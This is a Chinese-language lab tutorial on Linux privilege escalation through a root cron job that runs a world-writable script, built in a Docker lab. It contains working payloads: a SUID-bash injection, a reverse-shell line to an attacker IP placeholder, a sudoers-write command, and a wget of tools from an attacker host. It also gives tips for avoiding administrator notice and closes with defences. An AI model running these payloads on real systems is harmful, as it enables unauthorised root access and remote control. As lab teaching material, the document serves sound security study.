# Cron 计划任务提权（可写脚本）

## 原理

root 用户的 crontab 会周期性以 root 权限执行脚本。如果脚本文件本身（或脚本所在
目录）对普通用户可写，攻击者就能注入恶意代码（如 `chmod u+s /bin/bash` 或反弹
shell），等 cron 下一次执行时以 root 运行，完成提权。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/usr/local/bin/backup.sh 权限 777，root crontab 每分钟执行它

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/cron-writable-script        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it cron-writable-script su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. 确认目标脚本可写
ls -l /usr/local/bin/backup.sh
# 预期: -rwxrwxrwx (777, 任何人可写)

# 2. 注入恶意代码 (给 /bin/bash 加 SUID)
echo 'chmod u+s /bin/bash' >> /usr/local/bin/backup.sh

# 3. 等待 cron 执行 (最多 65 秒)
sleep 65

# 4. 验证提权
ls -l /bin/bash
# 预期: -rwsr-xr-x 1 root root ... /bin/bash
/bin/bash -p -c 'id'
# 预期: euid=0(root)   提权成功!
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：发现漏洞（枚举）

```bash
cat /etc/crontab                    # 系统 crontab
ls -la /etc/cron.d/ 2>/dev/null     # cron.d 目录
ls -l /usr/local/bin/backup.sh      # 重点: 脚本权限
# 预期: -rwxrwxrwx 1 root root ... backup.sh   (root 的脚本, 777 可写!)
```

也可用 pspy 监控周期性任务：
```bash
./pspy64 -i 1    # 实时显示 cron 执行的命令
```

### 第二步：理解 cron 执行机制

cron 读取任务定义后，**以任务属主（root）的身份执行命令，且不会重新检查脚本权限**。
`* * * * * /usr/local/bin/backup.sh` 表示每分钟执行一次。root 属主的 crontab 里
指向一个 777 脚本 = root 每分钟执行一次"任何人都能改的代码"。

### 第三步：注入 payload

```bash
echo 'chmod u+s /bin/bash' >> /usr/local/bin/backup.sh
```

追加（不覆盖）是为了不破坏原脚本功能，避免管理员发现。常见 payload：
- 改 SUID：`chmod u+s /bin/bash` 或 `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash`
- 反弹 shell：`bash -i >& /dev/tcp/攻击机IP/4444 0>&1`
- 写 sudoers：`echo 'lowpriv ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers`

### 第四步：等待并验证

```bash
sleep 65 && /bin/bash -p -c 'id'
# 预期: euid=0(root)
```

### 为什么用 chmod u+s /bin/bash 而不是直接反弹

直接反弹 shell 需要攻击机监听；改 SUID 是"被动等待"式，无人值守，cron 一执行就永久生效。

为什么能成功

- root 的 cron 以 root 身份执行 backup.sh
- 注入的 `chmod u+s /bin/bash` 由 root 执行, 给 bash 加上 SUID 位
- `/bin/bash -p` 保留 euid=0

## 踩坑记录

脚本权限必须是 777（可写 + 可执行）。如果只有 666（无 x 执行位），
cron 的 execve 会直接失败（EACCES），任务静默不执行。

## 防御

- root 任务脚本属主 root、权限 755
- 脚本内使用绝对路径
- 定期审计 /etc/crontab、crontab -l 与脚本目录权限


## 扩展教学（网络搜索整理）

### 完整枚举命令（HackTricks 版）

```bash
# 1. 所有 cron 面
cat /etc/crontab
ls -la /etc/cron.d/ && cat /etc/cron.d/* 2>/dev/null
ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
crontab -l 2>/dev/null

# 2. 找出 root 任务引用的所有脚本路径并检查可写性
find / -writable -not -path '/proc/*' -type f 2>/dev/null | grep -Ff <(
  grep -hoE '(/[a-zA-Z0-9._-]+)+.sh' /etc/crontab /etc/cron.d/* 2>/dev/null)

# 3. pspy 监控隐藏任务 (无权限读 crontab 时)
wget http://攻击机/pspy64 -O /dev/shm/pspy64 && chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # 等几分钟, 抓 root 进程命令行
```

### 其他可写入口（HackTricks 清单）

除脚本本身外，这些位置可写同样能提权：
- `/etc/crontab`（直接追加 root 任务行）
- `/etc/cron.d/*`（新增任务文件）
- `/var/spool/cron/crontabs/root`（root 个人 crontab）
- systemd timer 及其 ExecStart 指向的脚本

### 技巧

- **run-parts 忽略带点的文件名**：往 /etc/cron.daily 放 payload 时用
  `backup` 而不是 `backup.sh`，否则不执行
- **追加不覆盖**：在原脚本末尾追加 payload，降低被发现概率
- **目录可写 > 文件可写**：Linux 删除文件看目录权限——
  目录 777 时即使脚本 755 也能删除替换

### 检测与防御

- 脚本属主 root:root 且权限 755，目录 root:root 755
- crontab 与脚本全部绝对路径
- auditd 监控 /etc/crontab 与脚本变更
- 定期基线比对 cron 配置

## 验证记录

2026-08-26 真实环境验证：注入后等待 65 秒，`/bin/bash -p -c 'id'` 输出
`uid=1000(lowpriv) ... euid=0(root)`。复现成功。
